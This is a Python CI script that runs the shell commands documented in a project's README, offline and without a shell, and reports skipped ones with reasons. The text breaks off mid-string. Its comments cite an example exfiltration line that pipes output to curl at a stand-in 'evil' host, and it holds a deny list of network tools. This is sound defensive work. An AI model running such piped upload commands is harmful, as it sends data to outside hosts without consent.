#!/usr/bin/env python3
"""Execute every runnable command in README.md and fail if any of them fail.

Why this exists
---------------
toxindb's README is its primary interface. A command that is documented but no
longer runs is worse than no command at all, because it costs a reader their
time and their trust in every other line of the file. Nothing else in this
repository would notice that: the test suite exercises the Python API and the
CLI in-process, but it does not read README.md, so doc rot is invisible to it.

This script closes that gap. It parses the fenced ```bash blocks out of the
README, runs the ones that are safe to run, and exits non-zero if any of them
fails. It runs in CI on every push and pull request.

Design constraints
------------------
1. **No network.** Every command that is run is fully offline, which is the
   project's core promise. Commands that would need the network are skipped,
   and the skip is reported rather than hidden.
2. **No environment mutation.** Commands that create a venv or install packages
   are skipped. The CI job has already installed the package before this runs --
   as a *non-editable* install, which this script checks rather than assumes,
   because `toxindb demo` regenerates fixtures relative to the package
   directory and an editable install would send that into the checkout.
3. **Honest skips.** A skipped command is printed as SKIPPED with its reason.
   A gate that quietly ignores half the file is not a gate. For the same
   reason, a leading `cd` or `mkdir` does not make a command skippable: only
   the steps that actually assert something about toxindb are judged.
4. **No test-suite duplication.** The README's test block is skipped because the
   suite job runs it directly, which is a stronger check than shelling out.
5. **The checkout is not an output directory.** After running, the working tree
   is compared against its prior state and a change fails the job.
6. **No shell.** Commands are executed as an argv vector, never through
   ``/bin/sh``. This is not a style preference. Two concrete defects came from
   it: ``subprocess.run(..., shell=True)`` returns the *shell's* exit status, so
   a trailing ``&`` made ``toxindb nosuchsubcommand`` print PASS and exit 0; and
   command substitution -- ``$(...)`` or backticks -- was executed, so a
   documented line reached the shell and could do anything at all, quietly
   breaking constraint 1. A command that needs a shell to mean what it says is
   now skipped, with the reason printed.
"""

from __future__ import annotations

import argparse
import os
import re
import shlex
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

# Only a step that actually invokes toxindb may be executed.
#
# The first version of this gate worked the other way round: it enumerated
# commands that were unsafe and ran everything else. That is the wrong default,
# because "not on the list" silently becomes "run it" -- and a documented
# `toxindb demo | curl ...` line would have been executed, breaking the offline
# promise this project makes. Here anything unrecognised is skipped, and says so.
#
# The test is `_is_toxindb_invocation`, applied to the *unwrapped* argv vector.
# A named tuple of runnable prefixes used to sit here and nothing matched
# against it: the patterns were anchored at the start of the string, so
# `env toxindb ...`, `nohup toxindb ...`, `timeout 5 toxindb ...` and
# `FOO=bar toxindb ...` all failed to match, were reported as "not a toxindb
# command", and the gate exited 0 with those commands unverified. That is a
# silent skip of exactly the kind this file exists to avoid, so the constant was
# removed rather than left in place for the next reader to trust.

# Wrappers that put the real command somewhere other than the front of the argv.
# Each entry is the number of *non-option* arguments the wrapper consumes before
# the command, so `timeout 5 toxindb ...` skips `5` and `nice toxindb ...` skips
# nothing. Options are skipped by `unwrap_command`.
COMMAND_WRAPPERS: dict[str, tuple[int, ...]] = {
    "env": (),          # env [-i] [NAME=value]... CMD
    "nohup": (),        # nohup CMD
    "stdbuf": (),       # stdbuf [-o L] CMD
    "ionice": (),       # ionice [-c 3] CMD
    "timeout": (1,),    # timeout [-s SIG] DURATION CMD
    "nice": (),         # nice [-n 5] CMD
}

# Options that take a separate value. `timeout -s TERM 5 CMD` must drop both
# `-s` and `TERM`, or the wrapper's argument count is thrown off. `stdbuf` and
# `ionice` appear here for the same reason: their argument *is* an option value,
# which is why their bare-argument count is zero above -- counting it as a bare
# argument made `stdbuf -oL toxindb demo` skip the command itself and then report
# "not a toxindb command".
WRAPPER_VALUE_OPTIONS: dict[str, frozenset[str]] = {
    "env": frozenset({"-u", "--unset", "-C", "--chdir", "-S", "--split-string"}),
    "timeout": frozenset({"-s", "--signal", "-k", "--kill-after"}),
    "nice": frozenset({"-n", "--adjustment"}),
    "stdbuf": frozenset({"-i", "-o", "-e"}),
    "ionice": frozenset({"-c", "-n", "-p"}),
}

# Prefixes that are refused outright rather than unwrapped. Running the gate's
# commands as root would be a poor trade for coverage, and none of these appear
# in this repository's README today.
REFUSED_WRAPPERS: dict[str, str] = {
    "sudo": "would change privileges",
    "doas": "would change privileges",
    "su": "would change privileges",
    "xargs": "would build the command from its input",
}

# Shell syntax this gate does not execute. A command is run as an argv vector,
# so none of these can take effect -- but a documented line that contains them
# does something this gate cannot verify, and silently passing the literal text
# as an argument would report a green run for a command that was never
# exercised. Each is skipped with its reason printed.
_SHELL_SYNTAX: tuple[tuple[re.Pattern[str], str], ...] = (
    (re.compile(r"`"), "backtick command substitution"),
    (re.compile(r"\$\("), "command substitution"),
    (re.compile(r"\$"), "variable expansion"),
    (re.compile(r"&"), "background operator"),
    (re.compile(r"[<>]"), "redirection"),
    (re.compile(r"\|"), "pipeline operator"),
    (re.compile(r";"), "list operator"),
    (re.compile(r"[*?\[\]]"), "glob"),
    (re.compile(r"[~!{}()]"), "shell metacharacter"),
    # `#` only, and only where it can actually open a comment: at the start of a
    # word. It was in the character class above, which refused
    # `toxindb report runs#3.jsonl` -- a perfectly legal filename that a shell
    # also passes through untouched. A false refusal costs a real command its
    # check, and it is invisible: the line is reported as skipped, not failed.
    (re.compile(r"(?:(?<=\s)|^)#"), "comment operator"),
)

# Steps that only prepare the shell; they carry no assertion about toxindb and
# must not decide whether the command is skippable.
#
# This distinction is the whole reason commands are split. `cd . && toxindb
# monitor <broken path>` used to be skipped, because the skip rules matched
# the whole line and `cd` matched "directory navigation". The documented command
# then rotted in plain sight and the job stayed green. Setup decides where a
# command runs; the payload decides whether the job can check it.
SETUP_STEPS: re.Pattern[str] = re.compile(
    r"^\s*(?:"
    r"(?:cd|pushd)\b"              # change directory
    r"|mkdir\b"                    # create a scratch output directory
    r"|export\b|set\b"             # set an environment variable
    r"|source\b|\.\s+\S*activate"  # activate a virtualenv
    r")",
    re.VERBOSE,
)

# A payload step matching any of these must not be run here. The reason is
# printed so a reviewer can judge whether the skip is sound.
UNSAFE_STEPS: tuple[tuple[re.Pattern[str], str], ...] = (
    (re.compile(r"^\s*git\s+clone\b"), "clones the network"),
    (re.compile(r"^\s*git\s+(remote|fetch|pull|push|submodule)\b"), "network"),
    (
        re.compile(
            r"^\s*(?:python3?\s+-m\s+pip|pip|pip3)\b"
            r"|^\s*(?:python3?|\S*tox)\s+-m\s+pip\b"
        ),
        "mutates the environment",
    ),
    (re.compile(r"^\s*python3?\s+-m\s+venv\b"), "mutates the environment"),
    (
        re.compile(r"^\s*(?:pytest|py\.test)\b|^\s*python3?\s+-m\s+pytest\b"),
        "already run by the suite job",
    ),
    (
        re.compile(r"^\s*(?:source\b|\.\s+\S*activate)"),
        "mutates the shell environment",
    ),
    (re.compile(r"^\s*(?:rm|mv|cp)\b"), "destructive filesystem operation"),
    (re.compile(r"^\s*(?:touch|chmod|chown)\b"), "filesystem mutation"),
    (
        re.compile(
            r"^\s*(?:curl|wget|nc|ncat|netcat|ssh|scp|sftp|rsync|telnet)\b"
        ),
        "opens a network connection",
    ),
)

TIMEOUT_SECONDS = 300


def strip_inline_comment(line: str) -> str:
    """Remove a trailing `# ...` comment, respecting quotes."""
    out: list[str] = []
    quote: str | None = None
    i = 0
    while i < len(line):
        ch = line[i]
        if quote:
            out.append(ch)
            if ch == "\\" and i + 1 < len(line):
                out.append(line[i + 1])
                i += 2
                continue
            if ch == quote:
                quote = None
        elif ch in "'\"":
            quote = ch
            out.append(ch)
        elif ch == "#" and (not out or out[-1] in " \t"):
            break
        else:
            out.append(ch)
        i += 1
    return "".join(out).strip()


def split_steps(command: str) -> list[tuple[str, str]]:
    """Split a command on shell chaining, respecting simple quoting.

    Returns ``(joiner, step)`` pairs. `joiner` is the operator that placed this
    step after the previous one, and is ``""`` for the first.

    The operator is carried rather than discarded because `&&` and `||` mean
    opposite things, and treating them alike is not a rounding error. A
    documented `toxindb nosuchsub || toxindb --version` runs the second command
    only if the first *fails*, so the line succeeds; running it as `&&` stops at
    the failure and reports a correct line as broken, which is the kind of false
    failure that teaches a maintainer to ignore this job.
    """
    steps: list[tuple[str, str]] = []
    current: list[str] = []
    quote: str | None = None
    joiner = ""
    i = 0
    while i < len(command):
        ch = command[i]
        if quote:
            current.append(ch)
            if ch == quote:
                quote = None
            i += 1
            continue
        if ch in "'\"":
            quote = ch
            current.append(ch)
            i += 1
            continue
        # Two-character operators are tested before one-character ones, so
        # that `||` is not read as two pipes. The earlier version compared
        # *two*-character windows against a list containing the one-character
        # operators, so `cmd; other` and `cmd | head` were never split at all
        # and each was judged as a single step.
        if command[i:i + 2] in ("&&", "||"):
            steps.append((joiner, "".join(current).strip()))
            joiner, current = command[i:i + 2], []
            i += 2
            continue
        if ch in ";|\n":
            steps.append((joiner, "".join(current).strip()))
            joiner, current = ";", []
            i += 1
            continue
        current.append(ch)
        i += 1
    steps.append((joiner, "".join(current).strip()))
    return [(j, s) for j, s in steps if s]


_ASSIGNMENT = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")


def unwrap_command(tokens: list[str]) -> tuple[list[str], dict[str, str], str | None]:
    """Strip environment assignments and known wrappers off the front of `argv`.

    Returns ``(argv, assignments, reason)``. ``assignments`` are passed through
    to the child so that `PYTHONHASHSEED=0 toxindb demo` means the same thing it
    would in a shell. ``reason`` is set when the shape is not one this gate is
    willing to run, and the caller skips the command with that reason printed.

    `sudo`, `xargs` and friends are refused rather than unwrapped, because
    running this gate's commands as root, or building them from another
    command's output, buys nothing here.
    """
    assignments: dict[str, str] = {}
    index = 0
    while index < len(tokens):
        head = tokens[index]
        name = os.path.basename(head)
        if name in REFUSED_WRAPPERS:
            return [], assignments, REFUSED_WRAPPERS[name]
        if _ASSIGNMENT.match(head):
            key, _, value = head.partition("=")
            assignments[key] = value
            index += 1
            continue
        if name not in COMMAND_WRAPPERS:
            break
        index += 1
        taking = WRAPPER_VALUE_OPTIONS.get(name, frozenset())
        # Skip the wrapper's own options, and the value of any option that takes
        # one. `timeout -s TERM 5 CMD` must drop `-s`, `TERM` and `5` together,
        # or the wrapper's argument count is thrown off and `CMD` is dropped as
        # though it were a duration.
        while index < len(tokens):
            token = tokens[index]
            if token in taking:
                index += 2
                continue
            if token.startswith("-"):
                index += 1
                continue
            break
        index += len(COMMAND_WRAPPERS[name])
    if index >= len(tokens):
        return [], assignments, "no command after the assignments and wrappers"
    return tokens[index:], assignments, None


def shell_syntax_reason(command: str) -> str | None:
    """Why `command` needs a shell to mean what it says, or None if it does not.

    Scans outside quotes only, so a documented
    ``toxindb audit "reports/2024|q1"`` is not mistaken for a pipeline. Every
    construct listed here is something a shell would interpret and an argv
    vector would not: `$(...)` and backticks would run a command, `&` would
    background it and hand back a success status, `>` would write a file, and a
    glob would expand. None of that is visible to `subprocess.run(argv)`, so a
    command containing it is skipped instead of being run in a way that does not
    match its documentation.
    """
    index = 0
    while index < len(command):
        ch = command[index]
        if ch in "'\"":
            # Skip to the matching quote, honouring backslash escapes inside
            # double quotes only, as POSIX sh does. The index is advanced past
            # the closing quote, not just past the opening one -- an earlier
            # version used `for ... in enumerate()` and `continue`d, which moved
            # to the *next* character and so rejected `a|b` inside quotes anyway.
            closer = index + 1
            while closer < len(command):
                if ch == '"' and command[closer] == "\\":
                    closer += 2
                    continue
                if command[closer] == ch:
                    break
                closer += 1
            if closer >= len(command):
                return "unbalanced quote"
            index = closer + 1
            continue
        for pattern, reason in _SHELL_SYNTAX:
            if pattern.match(command, index):
                return reason
        index += 1
    return None


def plan_command(
    command: str,
) -> tuple[list[list[str]] | None, dict[str, str], str | None]:
    """Turn a documented line into argv vectors, or explain why it is skipped.

    Returns ``(steps, assignments, reason)``. ``steps`` holds one ``(joiner,
    argv)`` pair per payload step -- a line like ``toxindb demo && toxindb
    monitor x`` is two commands, not one, and concatenating them would run
    neither -- and the joiner is what tells the executor whether to run the next
    one after this one fails. Exactly one of ``steps`` and ``reason`` is None.
    """
    steps = split_steps(command)
    if not steps:
        return None, {}, "blank"
    if all(step.startswith("#") for _, step in steps):
        return None, {}, "comment only"

    payload = [(joiner, step) for joiner, step in steps if not SETUP_STEPS.match(step)]
    if not payload:
        return None, {}, "shell setup only, nothing to check"

    for _, step in payload:
        for pattern, reason in UNSAFE_STEPS:
            if pattern.search(step):
                return None, {}, reason

    # Allowlist, not denylist. Every payload step must be a toxindb
    # invocation; anything this gate does not recognise is skipped and says so.
    # With a denylist, a documented `toxindb demo | curl -T - https://evil`
    # would run, because no rule matched the piped stage.
    planned: list[tuple[str, list[str]]] = []
    assignments: dict[str, str] = {}
    for joiner, step in payload:
        syntax = shell_syntax_reason(step)
        if syntax is not None:
            return None, {}, syntax
        try:
            tokens = shlex.split(step)
        except ValueError as exc:
            return None, {}, f"cannot be tokenised: {exc}"
        if not tokens:
            return None, {}, "blank"
        argv, step_assignments, reason = unwrap_command(tokens)
        if reason is not None:
            return None, {}, reason
        # The allowlist is matched on the *unwrapped* argv, which is what fixes
        # the silent skip of `env toxindb ...`, `nohup toxindb ...`,
        # `timeout 5 toxindb ...` and `FOO=bar toxindb ...`.
        if not _is_toxindb_invocation(argv):
            return None, {}, "not a toxindb command"
        assignments.update(step_assignments)
        planned.append((joiner, argv))
    if not planned:
        return None, {}, "blank"
    return planned, assignments, None


def _is_toxindb_invocation(argv: list[str]) -> bool:
    """Does `argv` start by invoking toxindb, directly or via `python -m`?"""
    if not argv:
        return False
    if os.path.basename(argv[0]) == "toxindb":
        return True
    if re.fullmatch(r"python[0-9.]*", os.path.basename(argv[0])):
        return len(argv) >= 3 and argv[1] == "-m" and argv[2] == "toxindb"
    return False


def skip_reason(command: str) -> str | None:
    """Why this command must not be run, or None if it is safe to run.

    Kept as a one-liner over `plan_command` so the `--list` output and the
    executor can never disagree about what counts as skippable.

    Only payload steps can trigger a skip. A line such as
    ``mkdir -p reports && toxindb provenance examples/traces/clean.jsonl`` sets
    up an output directory and then asserts something about toxindb; skipping it
    because of the ``mkdir`` would leave the documented command unchecked.
    """
    return plan_command(command)[2]


def _diff_lines(before: str, after: str) -> list[str]:
    import difflib

    return [
        line
        for line in difflib.unified_diff(
            before.splitlines(),
            after.splitlines(),
            fromfile="tree before",
            tofile="tree after",
            lineterm="",
        )
    ]


def _is_within(path: Path, parent: Path) -> bool:
    try:
        path.relative_to(parent)
        return True
    except ValueError:
        return False


class GitUnavailable(RuntimeError):
    """`git` could not be executed at all.

    Deliberately distinct from "not a repository": the latter is a legitimate
    reason to skip the assertion with a printed note, but a missing git binary
    means the safety net silently vanishes, which must be a hard failure.
    """


class GitRefused(RuntimeError):
    """`git` ran, in a real checkout, and failed anyway.

    `_tree_state` returned None for *every* non-zero exit from `git status`, and
    None is the documented "outside a git checkout" answer. So a corrupt index,
    or git's own `safe.directory` refusal on a checkout owned by another uid,
    printed `skipped the working-tree assertion (not a git checkout)` and exited
    0 -- a note asserting the opposite of what happened, over the one assertion
    that shows a documented command did not rewrite the repository's fixtures.
    Verified: `GIT_DIR=/nonexistent-dir` on an otherwise healthy checkout exits
    0 with that note. Only the genuine "not a checkout" may be skipped.
    """


def _inside_a_checkout(root: Path) -> bool:
    """Is there a `.git` in `root` or any parent, the way git itself looks?

    Deliberately not a match on git's stderr text. `fatal: not a git repository`
    is one of several phrasings that varies with git version and locale; the
    presence of a `.git` entry is what actually decides the question. It may be a
    *file* rather than a directory -- that is what a linked worktree and a
    submodule both use -- so this tests `exists()`, not `is_dir()`.
    """
    for candidate in (root, *root.parents):
        if (candidate / ".git").exists():
            return True
    return False


def _tree_state(root: Path) -> str | None:
    """A snapshot of the tracked/untracked file list under `root`.

    Returns None outside a git checkout, where the assertion is skipped with a
    printed note rather than silently assumed to have passed.
    """
    # `--ignored=traditional` is load-bearing, and so was the `--ignored=matching`
    # that preceded it. Without any `--ignored` flag, a file that `.gitignore`
    # excludes is invisible here -- and this PR adds `*_canary_planted.jsonl` to
    # `.gitignore` precisely because following the README's `--plant` example
    # leaves that file behind. So the very pattern meant to keep the tree tidy
    # would have blinded the assertion meant to prove the tree stays tidy.
    #
    # `matching` fixed that for ignored *files* but broke it for ignored
    # *directories*: it collapses the whole directory to one `!! reports/` line
    # and never re-expands it, so a new file created inside an already-ignored
    # directory changed nothing at all. Verified: writing
    # `reports/LEAKED_SECRET.json` into an ignored `reports/` left the snapshot
    # byte-identical. `traditional` lists the files, so a new one shows up.
    # (A content change to an already-ignored file stays invisible, because git
    # does not track such files at all; only the file *list* is compared.)
    try:
        proc = subprocess.run(
            [
                "git",
                "status",
                "--porcelain",
                "--untracked-files=all",
                "--ignored=traditional",
            ],
            cwd=root,
            capture_output=True,
            text=True,
        )
    except FileNotFoundError as exc:
        raise GitUnavailable(str(exc)) from exc
    if proc.returncode != 0:
        # Distinguish "this is not a checkout" from "git is here and failed".
        # Conflating them is how a corrupt index or a `safe.directory` refusal
        # used to switch this assertion off and print a note asserting the
        # opposite. Only the first is a legitimate skip, and it is decided by
        # the absence of a `.git`, not by anything git says.
        if not _inside_a_checkout(root):
            return None
        raise GitRefused(
            f"`git status` exited {proc.returncode} in a checkout: "
            f"{proc.stderr.strip() or proc.stdout.strip() or 'no output'}"
        )
    # Byte-code caches are excluded. They come from importing the package, not
    # from a documented command, and on a fresh CI checkout they are always new
    # -- which is what made the first version of this assertion fail on
    # `!! toxindb/__pycache__/` and nothing else. Narrow by design: only
    # `__pycache__` directories and `.pyc` files, so an ignored *data* file such
    # as a planted canary is still a signal.
    #
    # Narrower still, on path components rather than on the substring
    # `"__pycache__" in line`. The substring also matched any path with that
    # text anywhere in its name -- `toxindb/report_cache.py`, a fixture called
    # `__pycache__notes.jsonl` -- and silently removed it from the comparison,
    # which is the exact failure the assertion exists to report.
    return "".join(
        line for line in proc.stdout.splitlines(keepends=True)
        if not _is_byte_code_cache(line)
    )


def _is_byte_code_cache(line: str) -> bool:
    """Is this `git status --porcelain` line a byte-code cache entry?

    `XY PATH`, so the path starts at offset 3. A rename reads `old -> new` and
    the new name is the one on disk.
    """
    entry = line[3:] if len(line) > 3 else ""
    path = entry.split(" -> ")[-1].strip().strip('"')
    return "__pycache__" in path.split("/") or path.endswith(".pyc")


_FENCE = re.compile(r"^\s*(?P<ticks>`{3,}|~{3,})\s*(?P<info>.*?)\s*$")
# Info strings that mean "these lines are shell commands". Attribute-suffixed
# forms count, because ```bash,ignore and ```{.bash} are the same thing as
# ```bash and matching only the literal string made this gate fail the day the
# README's fences were restyled.
_SHELL_WORDS = re.compile(
    r"\b(?:sh|bash|zsh|shell|console|shell-session|shellsession)\b", re.IGNORECASE
)
_UNLABELLED = re.compile(r"^\s*(?P<ticks>`{3,}|~{3,})\s*$")


def _is_shell_info(info: str) -> bool:
    return bool(_SHELL_WORDS.search(info.strip("{}").replace(".", " ")))


# A block-quote marker in front of a line. CommonMark allows a fenced code
# block inside a block quote, and `> ```bash` is a shell block a reader will
# reasonably copy. It used to be invisible: `_FENCE` is anchored at the start of
# the line, so the marker stopped it matching, and a `> ```bash` block holding a
# documented bad command was never run -- silently, with no skip reason, while
# the `ran == 0` floor stayed satisfied by whatever other block the document
# had. Stripped rather than specially handled, which over-scans: CommonMark lazy
# continuation and nesting are not modelled, and scanning content that a strict
# reader would call quote text can only find a command earlier, never later.
_QUOTE_PREFIX = re.compile(r"^ {0,3}(?:>[ \t]?)+")


def _report_unterminated(line_no: int, message: str, sink: list[int]) -> None:
    """Record and print an unclosed fence at `line_no`.

    One place, so the three call sites cannot drift in wording or in whether they
    print at all. They did once: the non-shell case reported the *shell* block's
    start offset, which sent the reader to a closed, healthy fence.
    """
    sink.append(line_no)
    print(f"::error::{line_no}: {message}", file=sys.stderr)


def extract_shell_blocks(
    markdown: str,
) -> tuple[list[tuple[int, list[str]]], list[tuple[int, list[str]]], list[int]]:
    """Split the document's fenced blocks into shell blocks and unlabelled ones.

    Returns ``(shell_blocks, unlabelled_blocks, unterminated)``, where the last
    is the list of line numbers of fences that are never closed.

    An unlabelled fence is *not* treated as shell. The usage synopsis in this
    README is a bare fence containing lines like
    ``toxindb monitor   TRACE [--output DIR]`` -- a shape, not a command, and
    running it would fail on the literal word ``TRACE``. Treating every bare
    fence as shell therefore trades one silent skip for a loud false failure.
    The contract stays one sentence: **commands in a ```bash block are
    executed**, and the unlabelled blocks come back so the caller can say
    plainly that they were left alone rather than letting them vanish.
    """
    shell_blocks: list[tuple[int, list[str]]] = []
    unlabelled: list[tuple[int, list[str]]] = []
    unterminated: list[int] = []
    lines = markdown.splitlines()
    # Three states, not two. A fence that is explicitly not shell (`python`,
    # `json`, `text`) still has to be *consumed*, or its closing ``` is read as
    # the opening of a brand-new unlabelled block, which is then never closed.
    # That produced a spurious "code fence opened here is never closed" error and
    # exit 1 for any document containing a single non-shell example -- found by
    # check_docs_teeth.py, and not visible in this README because it happens to
    # contain no non-shell fences.
    in_block = False
    ignoring = ""
    ignoring_start = 0
    shell = False
    fence = ""
    start = 0
    body: list[str] = []
    for number, line in enumerate(lines, 1):
        line = _QUOTE_PREFIX.sub("", line)
        fence_match = _FENCE.match(line)
        if ignoring:
            # Inside a fence we are deliberately not reading. Only its own
            # closing fence can end it -- and a closing fence has, by
            # definition, no info string.
            if (
                fence_match
                and fence_match.group("info") == ""
                and fence_match.group("ticks")[0] == ignoring[0]
                and len(fence_match.group("ticks")) >= len(ignoring)
            ):
                ignoring = ""
                continue
            if fence_match:
                # A fence carrying an info string cannot close the fence we are
                # skipping, so that fence is still open. This is the silent
                # version of the defect the check below reports: a forgotten
                # ```python swallowed every ```bash block after it, so a
                # documented `toxindb nosuchsubcommand` was never run, nothing
                # was printed about it, and `main()` returned 0 -- the job green
                # with an unverified command. Verified on a README with a
                # healthy block at line 5 and a `python` block at line 10 whose
                # only candidate closer was a ```bash at line 13.
                #
                # The report is at the fence's own line, not at whatever block
                # happened to be scanned last, and the new fence is then opened
                # normally so the commands after it are still checked. Resuming
                # is deliberately more permissive than CommonMark, which would
                # let the open fence run to the end of the document: this gate
                # over-scans in preference to missing a command, and it has
                # already said the structure is broken.
                _report_unterminated(
                    ignoring_start,
                    f"non-shell code fence opened here is never closed",
                    unterminated,
                )
                ignoring = ""
            else:
                continue
        if not in_block:
            if not fence_match:
                continue
            info = fence_match.group("info")
            plain = _UNLABELLED.match(line)
            shell = _is_shell_info(info) if info else False
            if not shell and not plain:
                # An explicitly non-shell fence (python, json, text, ...).
                # `ignoring_start` is kept because the unterminated report below
                # names this fence's line. Reusing `start` for it pointed the
                # error at line 0, or at an unrelated block's line, neither of
                # which is where the author has to look.
                ignoring = fence_match.group("ticks")
                ignoring_start = number
                continue
            in_block = True
            fence = fence_match.group("ticks")
            start, body = number, []
            continue
        # Closing fence: same character, no info string, and *at least* as long
        # as the opener. CommonMark requires that last part, and comparing only
        # the fence *character* is what let a 3-backtick line close a 4-backtick
        # ```bash block: everything after it became ordinary document text, so a
        # documented `toxindb nosuchsubcommand` was never run, never reported as
        # skipped, and the job was green. Verified both ways -- with a bad
        # command after the short closer the gate exited 0 with one command
        # executed, and with no real closer at all it reported no unclosed-fence
        # error, because the block looked closed.
        closing = _UNLABELLED.match(line)
        if (
            closing
            and closing.group("ticks")[0] == fence[0]
            and len(closing.group("ticks")) >= len(fence)
        ):
            (shell_blocks if shell else unlabelled).append((start, body))
            in_block = False
            fence, shell = "", False
            continue
        body.append(line)
    if in_block:
        # An unterminated fence. Reported rather than dropped: silently
        # discarding the contents would hide the commands this gate exists to
        # run, and would make the block count disagree with the reader's.
        #
        # And it is a *verdict*, not a warning. This used to print `::error::`
        # and let `main()` return 0, so a fence that was never closed silently
        # removed every command after it from the comparison: verified, a
        # well-formed block followed by an unterminated one ran 1 command,
        # printed `::error::`, and exited 0. A gate that reports a problem and
        # then passes is worse than one that is silent, because the reader
        # learns to ignore it.
        _report_unterminated(start, "code fence opened here is never closed", unterminated)
    if ignoring:
        # Same class of defect, in the fence we are deliberately not reading.
        # Reported, because a `python` block left open hides the rest of the
        # document just as thoroughly as a `bash` block left open.
        _report_unterminated(
            ignoring_start,
            "non-shell code fence opened here is never closed",
            unterminated,
        )
    return shell_blocks, unlabelled, unterminated


def logical_commands(
    lines: list[str], first_line: int = 1
) -> list[tuple[int, str]]:
    """Join backslash continuations, strip comments, drop blanks.

    Returns ``(line_number, command)`` pairs, where `line_number` is the line in
    the *document* the command starts on. This used to be a list of bare strings
    and every command in a block was reported at the opening fence's line
    number, so a failure pointed several lines away from the offending command
    and the printed line number was worse than useless on a long block. It is
    the one thing in a failure report a maintainer navigates by.
    """
    joined: list[tuple[int, str]] = []
    buffer = ""
    start = first_line
    for offset, raw in enumerate(lines):
        line = raw.rstrip()
        if not buffer:
            start = first_line + offset
        if line.endswith("\\"):
            buffer += line[:-1] + " "
            continue
        buffer += line
        stripped = strip_inline_comment(buffer)
        if stripped:
            joined.append((start, stripped))
        buffer = ""
    if buffer:
        stripped = strip_inline_comment(buffer)
        if stripped:
            joined.append((start, stripped))
    return joined


def _parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--readme",
        type=Path,
        default=Path(__file__).resolve().parents[2] / "README.md",
        help="path to the README to check (default: the repository README)",
    )
    parser.add_argument(
        "--list",
        action="store_true",
        help="print what would be run without running anything",
    )
    return parser.parse_args()


def _main() -> int:
    args = _parse_args()

    if not args.readme.is_file():
        print(f"error: README not found at {args.readme}", file=sys.stderr)
        return 2

    markdown = args.readme.read_text(encoding="utf-8")
    blocks, unlabelled, unterminated = extract_shell_blocks(markdown)
    if unterminated:
        # Reported, and the run continues. It used to return 1 here, which is
        # safe but throws away everything else: an author with one forgotten
        # fence gets told about the fence and nothing about the twelve commands
        # around it. Continuing keeps the exit code non-zero -- the structural
        # error is a verdict either way -- while still reporting which of the
        # documented commands work.
        #
        # Continuing is sound because nothing unrecognised is executed: every
        # command still has to clear the same allowlist, the same shell-syntax
        # refusal and the same unsafe-step rules, and the working tree is still
        # asserted before and after.
        print(
            f"::error::{len(unterminated)} code fence(s) are never closed "
            f"(first at line {unterminated[0]}). Anything a fence was meant to "
            f"cover but did not is read as ordinary document text, so this "
            f"check is not a complete comparison until the fence is fixed.",
            file=sys.stderr,
        )
    if not blocks:
        if unterminated:
            # The structural error is the diagnosis; "no bash blocks found" on
            # top of it would send the author looking for the wrong thing.
            return 1
        print(f"error: no ```bash blocks found in {args.readme}", file=sys.stderr)
        print("If the README lost its shell examples, delete this job instead of", file=sys.stderr)
        print("letting it pass vacuously.", file=sys.stderr)
        return 2
    if unlabelled:
        # Stated, not silent. A reader who assumes these were checked is worse
        # off than one who is told they were not.
        print(
            f"note: {len(unlabelled)} unlabelled code fence(s) not executed "
            f"(lines {', '.join(str(s) for s, _ in unlabelled)}); label a fence "
            f"```bash to have it checked",
            file=sys.stderr,
        )

    planned: list[
        tuple[
            int,
            str,
            list[tuple[str, list[str]]] | None,
            dict[str, str],
            str | None,
        ]
    ] = []
    for start, body in blocks:
        # `start` is the opening fence's line, so the first body line is start+1.
        for line_no, command in logical_commands(body, first_line=start + 1):
            steps, assignments, reason = plan_command(command)
            planned.append((line_no, command, steps, assignments, reason))

    if args.list:
        for line_no, command, steps, _assignments, reason in planned:
            if reason is not None:
                print(f"{f'SKIP ({reason})':44} README.md:{line_no}  {command}")
            else:
                # The argv is shown, not just "RUN": this is the view where a
                # mis-parsed line is easiest to spot, and every command is
                # executed with no shell.
                #
                # `steps` is a list of `(joiner, argv)` pairs, and the *joiner* is
                # printed rather than assumed. This line iterated argv directly,
                # which raised `TypeError: expected str instance, list found` on
                # the first runnable command -- so `--list`, the mode
                # `skip_reason`'s docstring nominates as the thing that "can never
                # disagree with the executor", had never once run. Rendering the
                # joiners also means the view cannot quietly claim a `||` chain
                # is an `&&` chain, which is the same defect this round found in
                # the executor.
                rendered = " ".join(
                    f"{joiner} {' '.join(argv)}".strip() for joiner, argv in steps or []
                )
                print(f"{f'RUN {rendered}':44} README.md:{line_no}  {command}")
        return 0

    failures: list[tuple[int, str, int, str]] = []
    ran = skipped = 0
    dirty = False
    repo_root = Path(__file__).resolve().parents[2]
    tree_before = _tree_state(repo_root)

    with tempfile.TemporaryDirectory(prefix="toxindb-docs-") as tmp:
        workdir = Path(tmp)
        # Run hermetically: copy the fixture data into a scratch directory and
        # execute there. Several documented commands write files (the demo
        # writes reports/, `canary --plant` writes a new trace), and running
        # them in the checkout would leave the working tree dirty on every CI
        # run. A gate that mutates the tree it guards is a bad gate.
        #
        # Copying examples/ is necessary but NOT sufficient. `toxindb demo`
        # regenerates its fixtures via `trace_gen.get_traces_dir()`, which
        # resolves relative to the *package* directory rather than the working
        # directory. With an editable install that is the checkout, so the demo
        # writes into the real tree no matter where it is invoked from. The
        # precondition below refuses to run in that configuration, and the
        # post-run assertion below catches any future leak that slips past it.
        # From repo_root, not the current directory, so the gate checks the same
        # tree it lives in whichever directory it was invoked from.
        examples = repo_root / "examples"
        if examples.is_dir():
            shutil.copytree(examples, workdir / "examples")
        else:
            print(
                "warning: no examples/ directory found at {examples}; commands "
                "that reference bundled fixtures will fail".format(examples=examples),
                file=sys.stderr,
            )

        # NOT .resolve(): on a venv created by `python -m venv`, sys.executable is
        # a symlink to the base interpreter, and resolving it would walk out of
        # the venv and point at the wrong bin directory entirely.
        bindir = Path(sys.executable).parent
        env = dict(os.environ)
        env["PATH"] = f"{bindir}{os.pathsep}{env.get('PATH', '')}"

        # Guard 1: if the console script that the README invokes does not belong
        # to this interpreter, we would be validating a *different* toxindb than
        # the one CI just built, and every result below would be meaningless.
        # Fail loudly rather than report a green gate that tested the wrong code.
        for name in ("toxindb",):
            resolved = shutil.which(name, path=env["PATH"])
            expected = bindir / name
            if resolved is None:
                print(
                    f"error: `{name}` is not on PATH after prepending {bindir}. "
                    f"Install the package before running this check "
                    f"(pip install .).",
                    file=sys.stderr,
                )
                return 2
            if Path(resolved).resolve() != expected.resolve():
                print(
                    f"error: `{name}` resolves to {resolved}, which is not the "
